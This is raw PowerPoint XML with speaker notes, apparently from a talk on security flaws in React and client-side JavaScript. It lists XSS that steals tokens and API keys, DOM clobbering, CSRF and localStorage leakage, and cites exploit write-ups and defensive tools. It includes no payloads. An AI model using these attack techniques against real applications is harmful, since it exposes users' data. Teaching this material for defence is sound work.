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37"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="256" r:id="rId2"/>
    <p:sldId id="264" r:id="rId3"/>
    <p:sldId id="291" r:id="rId4"/>
    <p:sldId id="304" r:id="rId5"/>
    <p:sldId id="290" r:id="rId6"/>
    <p:sldId id="289" r:id="rId7"/>
    <p:sldId id="292" r:id="rId8"/>
    <p:sldId id="293" r:id="rId9"/>
    <p:sldId id="266" r:id="rId10"/>
    <p:sldId id="268" r:id="rId11"/>
    <p:sldId id="258" r:id="rId12"/>
    <p:sldId id="288" r:id="rId13"/>
    <p:sldId id="259" r:id="rId14"/>
    <p:sldId id="262" r:id="rId15"/>
    <p:sldId id="267" r:id="rId16"/>
    <p:sldId id="261" r:id="rId17"/>
    <p:sldId id="263" r:id="rId18"/>
    <p:sldId id="272" r:id="rId19"/>
    <p:sldId id="294" r:id="rId20"/>
    <p:sldId id="282" r:id="rId21"/>
    <p:sldId id="295" r:id="rId22"/>
    <p:sldId id="273" r:id="rId23"/>
    <p:sldId id="274" r:id="rId24"/>
    <p:sldId id="269" r:id="rId25"/>
    <p:sldId id="296" r:id="rId26"/>
    <p:sldId id="297" r:id="rId27"/>
    <p:sldId id="286" r:id="rId28"/>
    <p:sldId id="298" r:id="rId29"/>
    <p:sldId id="285" r:id="rId30"/>
    <p:sldId id="283" r:id="rId31"/>
    <p:sldId id="277" r:id="rId32"/>
    <p:sldId id="301" r:id="rId33"/>
    <p:sldId id="270" r:id="rId34"/>
    <p:sldId id="299" r:id="rId35"/>
    <p:sldId id="300" r:id="rId36"/>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senia Peguero" initials="KP" lastIdx="4" clrIdx="0">
    <p:extLst>
      <p:ext uri="{19B8F6BF-5375-455C-9EA6-DF929625EA0E}">
        <p15:presenceInfo xmlns:p15="http://schemas.microsoft.com/office/powerpoint/2012/main" userId="S-1-5-21-32445488-941241147-642672607-472890" providerId="AD"/>
      </p:ext>
    </p:extLst>
  </p:cmAuthor>
  <p:cmAuthor id="2" name="Lewis Ardern" initials="LA" lastIdx="26" clrIdx="1">
    <p:extLst>
      <p:ext uri="{19B8F6BF-5375-455C-9EA6-DF929625EA0E}">
        <p15:presenceInfo xmlns:p15="http://schemas.microsoft.com/office/powerpoint/2012/main" userId="S-1-5-21-32445488-941241147-642672607-47754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878" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="65" d="100"/>
          <a:sy n="65" d="100"/>
        </p:scale>
        <p:origin x="10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B9C1469-6E22-4097-97FF-4A4CFAF81724}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>5/21/2018</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D9278AC-E332-4142-AA14-60688B5140C5}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="677541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javascriptreport.com/the-ultimate-guide-to-javascript-framework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reactjs.org/"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github.com/marcuswestin/store.js/"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github.com/zendesk/cross-storage" TargetMode="Externa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github.com/yannickcr/eslint-plugin-react/"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9278AC-E332-4142-AA14-60688B5140C5}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>1</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2535472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a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="421647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3</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4148000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4</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2351001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D9278AC-E332-4142-AA14-60688B5140C5}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>5</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1169711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According to JavaScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="0" dirty="0"/>
              <a:t>Report.com and their “The Ultimate Guide to JavaScript frameworks” </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://javascriptreport.com/the-ultimate-guide-to-javascript-frameworks/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ) there are over 50 client-side JavaScript frameworks. And most</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="0" dirty="0"/>
              <a:t> of them appeared in the last 5-7 years. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>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6</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="705444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9278AC-E332-4142-AA14-60688B5140C5}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>7</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3837736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9278AC-E332-4142-AA14-60688B5140C5}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2184930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9278AC-E332-4142-AA14-60688B5140C5}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>9</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="851163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Cross-site Scripting, DOM-XSS  - Sensitive data stealing (tokens, API keys)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Expression Language Injection - Angular, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Vue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="0" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Often results in XSS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Clickjacking - Now with SVGs, no JavaScript required!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DOM clobbering – since</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="0" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>2013 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Client-side trust - Too much data exposed to the client, Client-side validation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>CSRF - Client-side component with server-side verification</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Information leakage through </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>localStorage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="0" dirty="0"/>
              <a:t> - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Session ids, CSRF tokens, API keys</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DOM Clobbering from Gareth </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Heyes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> http://www.thespanner.co.uk/2013/05/16/dom-clobbering/</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{ED9278AC-E332-4142-AA14-60688B5140C5}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>10</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2801266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11</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="600362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12</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3817475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13</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1425261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14</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3816739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15</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="99611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hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>React</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> was introduced as an open source project in May, 2013.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr defTabSz="931774">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr defTabSz="931774">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>React uses Functional programming</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="0" dirty="0"/>
              <a:t> paradigm, although it’s not a fully functional language.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr defTabSz="931774">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr defTabSz="931774">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>One-way binding leads to more structured UIs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="0" dirty="0"/>
              <a:t> with strong hierarchy.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr defTabSz="931774">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr defTabSz="931774">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>In the meanwhile developers from AngularJS moved to React, as Angular was perceived as too unpredictable.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr defTabSz="931774">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The original author was Jordan </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Walke</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, an engineer at Facebook.</a:t>
            </a:r>
          </a:p>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16</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3859059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17</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1815789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18</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4063465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D9278AC-E332-4142-AA14-60688B5140C5}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>19</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4689533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HackerOne</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> vulnerability: http://danlec.com/blog/xss-via-a-spoofed-react-element - Daniel </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>LeCheminant</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>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20</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3135068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21</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4181949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22</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1189602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23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1324929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24</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1228954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25</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3554889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26</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1623307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27</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2927382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28</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1438794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29</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18658167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Reference:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>https://stackoverflow.com/questions/33225951/evaling-code-with-jsx-syntax-in-it</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>https://medium.com/dailyjs/exploiting-script-injection-flaws-in-reactjs-883fb1fe36c1</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{ED9278AC-E332-4142-AA14-60688B5140C5}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>30</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="402687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31</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3935102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pPr marL="174708" indent="-174708">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="174708" indent="-174708">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>https://fetch.spec.whatwg.org/#cors-protocol-and-credentials</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="174708" indent="-174708">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>https://github.com/github/fetch</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="174708" indent="-174708">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Example</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="0" dirty="0"/>
              <a:t> vulnerability in Redux: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>https://redux.js.org/advanced/example-reddit-api </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{ED9278AC-E332-4142-AA14-60688B5140C5}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>32</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3787140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vulnerability is not React-specific. React itself doesn’t have any wrappers around the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>localStorage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> object. Usually,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="0" dirty="0"/>
              <a:t> d</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>evelopers are just using the standard</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="0" dirty="0"/>
              <a:t> JavaScript API to set and retrieve data from it. H</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>owever, there are libraries that</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="0" dirty="0"/>
              <a:t> enhance the use of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="0" dirty="0" err="1"/>
              <a:t>localStorage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="0" dirty="0"/>
              <a:t> and can be used in React apps:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="232943" indent="-232943">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://github.com/marcuswestin/store.js/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> uses local storage by default</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="232943" indent="-232943">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>https://github.com/zendesk/cross-storage</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="232943" indent="-232943">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" baseline="0" dirty="0"/>
              <a:t>https://github.com/elgerlambert/redux-localstorage  </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" baseline="0" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" baseline="0" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" baseline="0" dirty="0"/>
              <a:t>References:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr defTabSz="931774">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>https://www.robinwieruch.de/local-storage-react/ </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" baseline="0" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{ED9278AC-E332-4142-AA14-60688B5140C5}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>33</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="21329090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type checking – to</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="0" dirty="0"/>
              <a:t> prevent XSS: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>https://www.npmjs.com/package/prop-types  </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ESLint</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> has a React</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="0" dirty="0"/>
              <a:t> plugin – </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="0" dirty="0" err="1"/>
              <a:t>ESLint</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="0" dirty="0"/>
              <a:t>-plugin-React: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://github.com/yannickcr/eslint-plugin-react/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
